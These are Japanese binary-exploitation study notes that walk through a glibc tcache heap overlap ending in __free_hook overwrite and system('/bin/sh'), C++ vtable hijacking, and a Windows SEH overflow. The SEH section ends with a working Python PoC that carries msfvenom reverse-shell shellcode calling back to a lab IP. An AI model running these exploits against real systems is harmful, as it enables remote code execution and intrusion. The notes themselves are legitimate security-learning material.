# consolidateのfree時にtcacheを7つ埋めないと結合されずにtcacheに格納されてしまう
for i in range(7):
    store(str(7+i),str(i)*(0xf0) )

A="14"    # Aは0x90 (8個freeしてunsorted_binsにする用)
B="15"    # Bは0x20 (0x90のunsorted_binsの時にtopと結合されないため用)
C="0"     # Cは0x100 (free時にconsolidateする用)

store(A,"A"*0x80)
# このBは0x90の8個目のfree時にtopとの結合を防ぐため必ず直後にある必要がある！
store(B,"B"*0x10)          <- [1]

# 0x90を7個free
for i in range(7):
    delete(str(i))

store(C,"C"*0xf0)
# 0x100のfreeのconsolidate時にtopと結合されないように必ず直後にある必要がある！
store("1","1"*0x10)         <- [2]
# ここで8個目の0x90をfreeしてunsorted_binsに入れる。
# unsortedに入れた後にmallocすると、ここから切り出されてしまうためその前に必要なもの(Cや1)をmallocする！
delete(A)                   <- [3]

# 0x100を7つfreeしてtcacheを埋める。これでfree時にtcacheには入らずに結合(consolidate)される！
for i in range(7):
    delete(str(i+7))        <- [4]

# Cの0x101を0x100に書き換えて、PREV_SIZEを0x0にする
for i in range(8):
    delete(B)
    store(B,"b"*(0x18-i))
# CのPREV_SIZEに0xb0を書き込む
delete(B)
# Bのchunkはこれ以降freeしないのがポイント！このfdにmain_arenaが書き込まれるようにあれこれする！
store(B,"b"*0x10+"\xb0")    <- [5]

# A,B,Cが結合されて、0x1b0のchunkとなる
delete(C)                   <- [6]

# tcache[0x90]を使い切る
for i in range(7):
    store(str(i),"a"*0x80)
# 8個目の0x90のmallocは0x1b0から切り出される！
# この時返されるアドレスがBと同じで、Bはfreeされていないので2回freeできる！(同じアドレスを二つの変数で持っている)
store(A,"a"*0x80)           <- [7]
```
```txt
--------------------------------------------------------------------------------------
[1]

|   heap    heap |
|                |
|           0x91 |
|                | 
|           0x91 |
|                |
|    ~        ~  |
|                |
|           0x91 | <- 7個目 
|                | 
|           0x101| 
|                | 
|           0x101| 
|                | 
|             ~  | 
|                | 
|           0x101| <- 7個目 
|                |
|           0x91 | <- A
|                |
|           0x21 | <- B
|                |

--------------------------------------------------------------------------------------
[2]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0

|                | 
|           0x101| <- 7個目 
|                |
|           0x91 | <- A
|                |
|           0x21 | <- B
|                |
|           0x101| <- C 
|                |
|           0x21 | <- 1
|                |
--------------------------------------------------------------------------------------
[3]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- 0x90のunsortedを作成！
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020 <- unsortedしたので0x21から0x20に上書き
0x555555757de0:	0x4242424242424242	0x4242424242424242
0x555555757df0:	0x0000000000000000	0x0000000000000101
0x555555757e00:	0x4343434343434343	0x4343434343434343
--------------------------------------------------------------------------------------
[4]
tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0  特になにも変化なし。0x100を7つtcacheに入れただけ
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020
0x555555757de0:	0x4242424242424242	0x4242424242424242
0x555555757df0:	0x0000000000000000	0x0000000000000101
0x555555757e00:	0x4343434343434343	0x4343434343434343

--------------------------------------------------------------------------------------
[5]

0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020
0x555555757de0:	0x6262626262626262	0x6262626262626262
0x555555757df0:	0x00000000000000b0	0x0000000000000100 <- 0xb0,0x100が上書きされた！
0x555555757e00:	0x4343434343434343	0x4343434343434343    これでconsolidateする準備OK


--------------------------------------------------------------------------------------
[6]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */


0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x00000000000001b1 <- 0x1b1の結合されたchunkに！
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020
0x555555757de0:	0x6262626262626262	0x6262626262626262
0x555555757df0:	0x00000000000000b0	0x0000000000000100
0x555555757e00:	0x4343434343434343	0x4343434343434343

------------------------------------------------------------------------------------
[7]

tcachebins
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757dd0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757dd0

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091 <- 0x1b0から0x90に(0x90を切り出した)
0x555555757d50:	0x6161616161616161	0x6161616161616161
0x555555757d60:	0x6161616161616161	0x6161616161616161
0x555555757d70:	0x6161616161616161	0x6161616161616161
0x555555757d80:	0x6161616161616161	0x6161616161616161
0x555555757d90:	0x6161616161616161	0x6161616161616161
0x555555757da0:	0x6161616161616161	0x6161616161616161
0x555555757db0:	0x6161616161616161	0x6161616161616161
0x555555757dc0:	0x6161616161616161	0x6161616161616161
0x555555757dd0:	0x0000000000000000	0x0000000000000121 <- unsortedの切り出された残りはここ！
0x555555757de0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- このアドレスが返された！
0x555555757df0:	0x00000000000000b0	0x0000000000000100    showでlibcleakもできるし、double freeもできる！
0x555555757e00:	0x4343434343434343	0x4343434343434343

```
#### Heapでの system("/bin/sh")実行の流れ

```txt
------------------------------------------------------------------------------------
0x40サイズのmallocによって、偽のチャンクの0x555555757a90が返り、tcache[0x100]のnextに_free_hookアドレスを書き込んでfree後

(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
(0x40)   tcache_entry[2](1): 0x555555757ab0
(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041 <- この偽のチャンクを使って_free_hookアドレスを書き込み、tcache[0x100]にoverlapさせる
0x555555757ab0: 0x0000000000000000      0x555555757010
0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101 <- freeすることでこの偽の0x100chunkに対応するtcache[0x100]に0x555555757ad0を代入(overlapする)
0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- _free_hookを上書きした
0x555555757ae0: 0x3737373737373737      0x3737373737373737


    ch.alloc(0xf8, '0') [1]
    ch.wipe()

    ch.alloc(0xf8, p64(addr_libc_system)) [2]
    ch.wipe()

    ch.alloc(0x38, '/bin/sh') [3]
    ch.delete(False) [4]
    
[1] 次に0x100サイズmallocすれば、0x555555757ad0がmallocによって返り、nextの0x00007ffff7dd18e8がtcache[0x100]に入る

[2] そのあと、freeせずにまた0x100サイズmallocすれば、0x00007ffff7dd18eがmallocによって返り、_free_hookアドレスにp64(addr_libc_system)を書き込める！
    これで、次にfreeするとsystem関数が実行される！
    
[3] そのあと、freeせずに適当なサイズ(0x40とか)mallocし、"/bin/sh"をmallocが返したアドレスに書き込む

[4] この後にfreeすれば、system("/bin/sh")が実行される！
    free関数はfree(content)となっており、contentはmallocが返したアドレスを指している
    このとき、content(というアドレス)には"/bin/sh"という文字列が入っている
    なので、free(content)はsystem(content)と同じであり、content="/bin/sh"なのでsystem("/bin/sh")が実行される！

```

#### C++のvtableの書き換え
子クラスのメンバ関数を親クラスのポインタ経由で呼び出したとき、親クラスのメンバ関数ではなく子クラスのメンバ関数が呼びだされる。   
C++では`virtual`で装飾されているメンバ関数がこの動作をし、**vtable**(仮想関数テーブル)で実現される。   
```C++
// Birdクラス
struct Bird {
    string name() {return typeid(*this).name();};
    virtual void sing() = 0;     // sing()を仮想関数として宣言
    virtual ~Bird() = default;   // 子クラスで再定義できる
};

// Parrotクラスは publicで Birdクラスを継承
class Parrot: public Bird {
    string memory;
public:
    Parrot () {            // コンストラクタ(初期化) 
        cout<<"Input: ";
        cin>>memory.data();   // この部分にHeap overflowの脆弱性 cin>>memory; とするべき
                              // _M_local_bufの0x10サイズ以上を書き込むことで次のstringの_M_pを上書きできる
    }
    void sing() override {cout<<memory.c_str()<<endl;} // overrideで親クラスのsing()を再定義
};

Bird *cage[4];  // 親クラスBirdのポインタ

// 子クラスParrotのオブジェクトを親クラスBirdのポインタ経由で生成
// newの内部でmallocが実行され、Heapのアドレスがcage[0]に代入される
void malloc() {
    cage[0] = new Parrot();  // 子クラスParrotのオブジェクトを生成
}

// 親クラスBirdのポインタcage経由で子クラスParrotのメンバ関数sing()を呼び出す
void show() {
    cage[0]->sing();       // 子クラスParrotのsing()が呼びだされる
}
```
親クラスBirdのポインタcage経由で子クラスParrotのメンバ関数sing()を呼び出す際の動作   
```txt

 Birdクラス(親)のポインタ*cage
0x605380 |                      |
0x605388 |  Parrot_object_addr  | <- [1] Birdクラスのポインタcage[0] (0x001010)
0x605390 |                      |

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | <- Birdクラスのポインタcage
0x001010 | Parrot_vtable+0x10   | <- [2] Parrotのvtableへのアドレス (0x604d10) new Parrot()がこのアドレスを返す
0x001018 |　      _M_p          | <- 文字列のポインタ (0x001028)
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- 文字列のサイズは0x10 cin>>memory.data()はここに書き込まれる
0x001030 |       ......         | <- prev_sizeは使用済み
0x001038 |     chunk size       | 
0x001040 |     vtable+0x10      |
0x001048 |　      _M_p          | <- 文字列のポインタ (0x001028)
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

 Parrotのvtable
0x604d00 |         0x0          | <- 多重継承に使う情報
0x604d08 |     typeinfo_addr    | 
0x604d10 |  Parrot.sing()_addr  | <- [3] Parrotクラスの仮想メンバ関数のアドレス
```
**Heap leak**   
```txt
_M_p(文字列のポインタ)を書き換えて、既知の任意のアドレスの値を読みだす！
Heapをleakするには、mallocが返すアドレスがある変数のアドレスの値をleakする！
2つ分のchunkをmallocしておいて、一つ目をfreeして、Heap overflowで2つ目の_M_pを書き換える

 Birdクラス(親)のポインタ*cage
0x605380 |                      |
0x605388 |  Parrot_object_addr  | <- Heapのアドレスが書き込まれている！ (0x001010)
0x605390 |                      |

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x604d10) 書き換えないように
0x001048 |　      _M_p          | <- p64(0x605388) cage変数のアドレス
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

```
**libc leak**
```txt
Heap leakとほぼ同じ
libcをleakするには、すでに呼びだされた関数(libc_start_mainなど)のGOTにあるlibcのアドレスをleakする！

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x604d10) 書き換えないように
0x001048 |　      _M_p          | <- p64(0x604fe8) libc_start_mainのGOT_addr 
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |
```
**one-gadget-rce**
```txt
Heap leak, libc leakが前提条件
Heapのvtableの場所に書かれている関数が実行されるので、Heapにone-gaget-rceのアドレスを書き込んでそのアドレスにvtableの場所を書き換える

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x001048) このアドレスにはメンバ関数のアドレスが書かれていた
0x001048 |　      _M_p          | <- p64(0x7fffffff12345678) 偽のvtable(一個上)がここを指している
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

```
### SEH overflow
Windowsの例外処理の際に実行されるハンドラーのアドレスはスタック上に格納されるため、そこをうまい感じに書き換えてやると任意のアドレスにjmpされられる(EIPを制御できる)   
**SEHレコード**   
```txt
typedef struct _EXCEPTION_REGISTRATION_RECORD  <- SEHレコード(スタック上に存在)
{
 struct _EXCEPTION_REGISTRATION_RECORD *_next;   <- 次のSEHレコードのnextのアドレス
 PEXCEPTION_ROUTINE _handler;                    <- 例外処理のハンドラー(例外発生時に実行される)
} EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;

   スタック       アドレス
|             | (0x000)
|    next_1   | (0x004) <- [0x18] next_2を指している
|  handler_1  | (0x008) <- [handler_1の処理のアドレス]
|             | (0x00c)
|             | (0x0010)
|             | (0x0014)
|    next_2   | (0x0018)
|  handler_2  | (0x001c)

```
**例外ハンドラの引数**    
```txt
EXCEPTION_DISPOSITION __cdecl _except_handler (    <- handlerが呼びだされる際の引数を定義
 _In_ struct _EXCEPTION_RECORD *_ExceptionRecord,
 _In_ void * _EstablisherFrame,                    <- SEHレコードのnextのアドレスを二つ目(esp+8)に持つ
 _Inout_ struct _CONTEXT *_ContextRecord,
 _Inout_ void * _DispatcherContext
);
```
#### Payload実行までの流れ
(esp+8)にSEHレコードのnextのアドレスが存在するため、pop,pop,retを実行することで、
このSEHレコードのnextのアドレスをEIPに代入できる！！   
```txt
-------------------------------------------------------------------
call handler_1(EIPにhandler_1のアドレスを代入)直前

例外が発生したのをキャッチしてhandler_1が実行される直前の時、
handler_1関数を実行するために必要な引数がスタック上に用意された状態になる。

   スタック       アドレス
|             | (0x000)
|   E_Record  | (0x004) <- esp  
|   E_Frame   | (0x008) <- esp+4  SEHレコードのアドレス"0x104"が書き込まれている
|   C_Record  | (0x00c)
|   D_Context | (0x010)
       ~           ~
|             | (0x100)
|    next_1   | (0x104) <- "AAAA"をbofで上書き
|  handler_1  | (0x108) <- pop,pop,retのアドレスで上書き
|             | (0x10c)    ほんとはここにjmp eaxみたいにしたいけど、
|             | (0x0110)   レジスタはすべて悪用防止のため0初期化されてしまう。
|             | (0x0114)   だからpop,pop,retとかいう面倒なやり方をするしかない
|    next_2   | (0x0118)
|  handler_2  | (0x011c)
-------------------------------------------------------------------
call handler_1(EIPにhandler_1のアドレスを代入)直後
pop,pop,ret直前

EIP = pop,pop,retのアドレス

スタック       アドレス
|   ret_addr  | (0x000) <- esp handler_1のret_addrがcall時にpushされたのでespがずれた！
|   E_Record  | (0x004) <- esp+4
|   E_Frame   | (0x008) <- esp+8 (esp+4からesp+8に変わった！)
|   C_Record  | (0x00c)
|   D_Context | (0x010)
       ~           ~
|             | (0x100)
|    next_1   | (0x104) <- "AAAA"をbofで上書き
|  handler_1  | (0x108) <- pop,pop,retのアドレスで上書き
|             | (0x10c)
|             | (0x0110)
|             | (0x0114)
|    next_2   | (0x0118)
|  handler_2  | (0x011c)

-------------------------------------------------------------------
ret直前　(pop,pop後)

スタック       アドレス
|   ret_addr  | (0x000) 
|   E_Record  | (0x004) 
|   E_Frame   | (0x008) <- esp  SEHレコードのアドレス"0x104"が書き込まれている
|   C_Record  | (0x00c) <- esp+4
|   D_Context | (0x010)
       ~           ~
|             | (0x100)
|    next_1   | (0x104) 
|  handler_1  | (0x108) 
|             | (0x10c)
|             | (0x0110)
|             | (0x0114)
|    next_2   | (0x0118)
|  handler_2  | (0x011c)
-------------------------------------------------------------------
ret直後　

ret命令で、その時にESPが指している値をEIPに代入
EIP = 0x104

スタック       アドレス
|   ret_addr  | (0x000) 
|   E_Record  | (0x004) 
|   E_Frame   | (0x008)        SEHレコードのアドレス"0x104"がEIPに代入された！
|   C_Record  | (0x00c) <- esp
|   D_Context | (0x010) <- esp+4
       ~           ~
|             | (0x100)
|    next_1   | (0x104) <- EIP "AAAA"が書き込まれているので、次は命令"0x41414141"を実行しようとする！
|  handler_1  | (0x108) <- pop,pop,retのアドレスで上書きされている
|             | (0x10c)
|             | (0x0110)
|             | (0x0114)
|    next_2   | (0x0118)
|  handler_2  | (0x011c)

"0x108"にはアドレスが書き込まれており、命令ではないためここに処理が進むとエラーとなってしまう！
この"0x41414141"を"jmp $+8"とかで"0x10c"に向けて、そこに"jmp $-0x300"命令を書いておけば、サイズの大きいスタック領域をEIPが指すようになる！
そこにペイロードをセットしておけば、ペイロードを実行できる！
```
#### SafeSEH
例外ハンドラのアドレスを事前に保存している例外ハンドラテーブルを用意し、例外ハンドラが呼びだされる際にそのテーブルにあるアドレスかどうかを確認することで、例外ハンドラのアドレスの上書きを検知する。   
```txt
まず、呼び出されたハンドラのアドレスがどの実行可能イメージのアドレスなのかを確認する

if (その実行可能イメージが例外ハンドラテーブルを持っている):
   if (呼び出されたハンドラのアドレスが例外ハンドラテーブルに存在する):
      実行
   else (例外ハンドラテーブルに存在しない):
      上書きを検知！実行しない
else (実行可能イメージがテーブルを持っていない):
   実行

したがって、SafeSEHが無効(SafeSETオプションなしでコンパイルされた)のイメージ(.exeや.dll)のアドレスで上書きした場合はSafeSEHで実行を阻止できない！
つまり、
    SafeSEH無効のイメージからpop,pop,retのアドレスをhandlerに上書きすればよい！
    
```
#### PoC
```python
import sys
import socket
host = "192.168.56.6"
port = 9999

badheader = "GMON /"
baddata = b"\x90" * 2773
#start payload
baddata += "\x90"*16
# sudo msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=192.168.56.5 -b "\x00\x0a\x0d" -f py --var-name baddata
baddata += b"\xd9\xc1\xd9\x74\x24\xf4\xbe\xcf\x6f\x35\xbb\x58"
baddata += b"\x31\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\x0f"
baddata += b"\x6b\xd7\x4e\x73\x9c\x95\xb1\x8b\x5d\xfa\x38\x6e"
baddata += b"\x6c\x3a\x5e\xfb\xdf\x8a\x14\xa9\xd3\x61\x78\x59"
baddata += b"\x67\x07\x55\x6e\xc0\xa2\x83\x41\xd1\x9f\xf0\xc0"
baddata += b"\x51\xe2\x24\x22\x6b\x2d\x39\x23\xac\x50\xb0\x71"
baddata += b"\x65\x1e\x67\x65\x02\x6a\xb4\x0e\x58\x7a\xbc\xf3"
baddata += b"\x29\x7d\xed\xa2\x22\x24\x2d\x45\xe6\x5c\x64\x5d"
baddata += b"\xeb\x59\x3e\xd6\xdf\x16\xc1\x3e\x2e\xd6\x6e\x7f"
baddata += b"\x9e\x25\x6e\xb8\x19\xd6\x05\xb0\x59\x6b\x1e\x07"
baddata += b"\x23\xb7\xab\x93\x83\x3c\x0b\x7f\x35\x90\xca\xf4"
baddata += b"\x39\x5d\x98\x52\x5e\x60\x4d\xe9\x5a\xe9\x70\x3d"
baddata += b"\xeb\xa9\x56\x99\xb7\x6a\xf6\xb8\x1d\xdc\x07\xda"
baddata += b"\xfd\x81\xad\x91\x10\xd5\xdf\xf8\x7c\x1a\xd2\x02"
baddata += b"\x7d\x34\x65\x71\x4f\x9b\xdd\x1d\xe3\x54\xf8\xda"
baddata += b"\x04\x4f\xbc\x74\xfb\x70\xbd\x5d\x38\x24\xed\xf5"
baddata += b"\xe9\x45\x66\x05\x15\x90\x29\x55\xb9\x4b\x8a\x05"
baddata += b"\x79\x3c\x62\x4f\x76\x63\x92\x70\x5c\x0c\x39\x8b"
baddata += b"\x37\xf3\x16\xab\xc2\x9b\x64\xcb\xdd\x07\xe0\x2d"
baddata += b"\xb7\xa7\xa4\xe6\x20\x51\xed\x7c\xd0\x9e\x3b\xf9"
baddata += b"\xd2\x15\xc8\xfe\x9d\xdd\xa5\xec\x4a\x2e\xf0\x4e"
baddata += b"\xdc\x31\x2e\xe6\x82\xa0\xb5\xf6\xcd\xd8\x61\xa1"
baddata += b"\x9a\x2f\x78\x27\x37\x09\xd2\x55\xca\xcf\x1d\xdd"
baddata += b"\x11\x2c\xa3\xdc\xd4\x08\x87\xce\x20\x90\x83\xba"
baddata += b"\xfc\xc7\x5d\x14\xbb\xb1\x2f\xce\x15\x6d\xe6\x86"
baddata += b"\xe0\x5d\x39\xd0\xec\x8b\xcf\x3c\x5c\x62\x96\x43"
baddata += b"\x51\xe2\x1e\x3c\x8f\x92\xe1\x97\x0b\xa2\xab\xb5"
baddata += b"\x3a\x2b\x72\x2c\x7f\x36\x85\x9b\xbc\x4f\x06\x29"
baddata += b"\x3d\xb4\x16\x58\x38\xf0\x90\xb1\x30\x69\x75\xb5"
baddata += b"\xe7\x8a\x5c"

baddata += "\x90"*(3518 - len(baddata))

baddata += "\xeb\x0f\x90\x90" # jmp $+0x11
baddata += "\xb4\x10\x50\x62" # SafeSEH無効のモジュールのpop,pop,retのアドレス
baddata += "\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1\xe8\xf2\xff\xff\xff" # 大きい領域にjmp $-758する
baddata += "D"*(4000-len(baddata))

print("Sending payload....")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((host,port))
s.send(badheader + baddata)
s.close()
```
## よく見るかたまり
#### 関数の先頭
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
push ebp
mov ebp, esp
sub esp, 100h
```
```txt
call 直前    ->     push ebp 直前  ->  mov ebp, esp 直前  -> sub esp, 100h 直前   ->  sub esp, 100h 直後
(Low)
|      |            |        |         |         |          |         |              |         | __ esp 
|      |            |        |         |         |          |         |              |   ...   | 
|      |            |        |         |         |          |         |              |   100h  |
|      |            |        |         |         | __ esp   |         | __ esp,ebp   |   ...   | __ ebp
|      |            |        | __ esp  |saved_ebp|          |saved_ebp|              |saved_ebp|
|      | __ esp     | F1_ret |         | F1_ret  |          | F1_ret  |              | F1_ret  |
| arg1 |            |  arg1  |         |  arg1   |          |  arg1   |              |  arg1   | 
| arg2 |            |  arg2  |         |  arg2   |          |  arg2   |              |  arg2   |
| ...  | __ ebp     |  ...   | __ ebp  |   ...   | __ ebp   |   ...   |              |   ...   |
|      |            |        |         |         |          |         |              |         |
(High)
```
#### 関数の終わり
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
...
mov esp,ebp
pop ebp
ret
```
```txt
mov esp,ebp 直前 -> pop ebp 直前        ->     ret 直前    ->     ret 直後   
(Low)
|         | __ esp  |         |             |         |         |         |
|   ...   |         |   ...   |             |   ...   |         |   ...   |
|   100h  |         |   100h  |             |   100h  |         |   100h  |
|   ...   | __ ebp  |   ...   | __ ebp,esp  |   ...   |         |   ...   |
|saved_ebp|         |saved_ebp|             |saved_ebp| __ esp  |saved_ebp|
| F1_ret  |         | F1_ret  |             | F1_ret  |         | F1_ret  | __ esp
|  arg1   |         |  arg1   |             |  arg1   |         |  arg1   |
|  arg2   |         |  arg2   |             |  arg2   |         |  arg2   |
|   ...   |         |   ...   |             |   ...   | __ ebp  |   ...   | __ ebp
|         |         |         |             |         |         |         |
(High)
```
#### main関数の状態

```txt
main関数は　<__libc_start_main+231> から呼ばれる。
saved_rbpは　0x400970 (<__libc_csu_init>)で以外と小さい
rbpは<__libc_csu_init>を指しており、その下にリターンアドレスがある

gdb-peda$ tel $rbp-0x30 20
0000| 0x7fffffffde60 --> 0x0 
0008| 0x7fffffffde68 --> 0x0 
0016| 0x7fffffffde70 --> 0x0 
0024| 0x7fffffffde78 --> 0x0 
0032| 0x7fffffffde80 --> 0x7fffffffdf70 --> 0x1 
0040| 0x7fffffffde88 --> 0x293133f802e74a00 
0048| 0x7fffffffde90 --> 0x400970 (<__libc_csu_init>:	push   r15)  <- rbpが指しているsaved_rbp
0056| 0x7fffffffde98 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax) <- リターンアドレス
0064| 0x7fffffffdea0 --> 0x1 
0072| 0x7fffffffdea8 --> 0x7fffffffdf78 --> 0x7fffffffe2b5 ("/home/takabaya-shi/environment/CTF-writeup/malleus-pwn/rot13/rot13")
0080| 0x7fffffffdeb0 --> 0x100008000 
0088| 0x7fffffffdeb8 --> 0x4007a2 (<main>:	push   rbp)
0096| 0x7fffffffdec0 --> 0x0 
0104| 0x7fffffffdec8 --> 0xd1145d117ed72115 
0112| 0x7fffffffded0 --> 0x400650 (<_start>:	xor    ebp,ebp)
0120| 0x7fffffffded8 --> 0x7fffffffdf70 --> 0x1 
0128| 0x7fffffffdee0 --> 0x0 
0136| 0x7fffffffdee8 --> 0x0 
0144| 0x7fffffffdef0 --> 0x2eeba26ed1772115 
0152| 0x7fffffffdef8 --> 0x2eebb2d1daa92115 
```
#### strcmp
```txt
   0x55555555529e <main+293>:	lea    rax,[rbp-0x90]
   0x5555555552a5 <main+300>:	lea    rsi,[rip+0xd81]        # 0x55555555602d
   0x5555555552ac <main+307>:	mov    rdi,rax
=> 0x5555555552af <main+310>:	call   0x555555555070 <strcmp@plt>
   0x5555555552b4 <main+315>:	test   eax,eax
   0x5555555552b6 <main+317>:	jne    0x5555555552dd <main+356>
```
`RSI`レジスタと`RDI`レジスタに比較したい文字列を代入して、一致しているかを見る。一致していなければ、JNEで不一致の処理に入る。
#### 変数

```txt
│           ; var char *s1 @ rbp-0x30

│           0x00400997      488d45d0       lea rax, [s1]         <- rsp-0x30のアドレスをraxに代入。getsの内容がここに書き込まれる
│           0x0040099b      4889c7         mov rdi, rax                ; char *s
│           0x0040099e      e88dfdffff     call sym.imp.gets           ; char *gets(char *s)

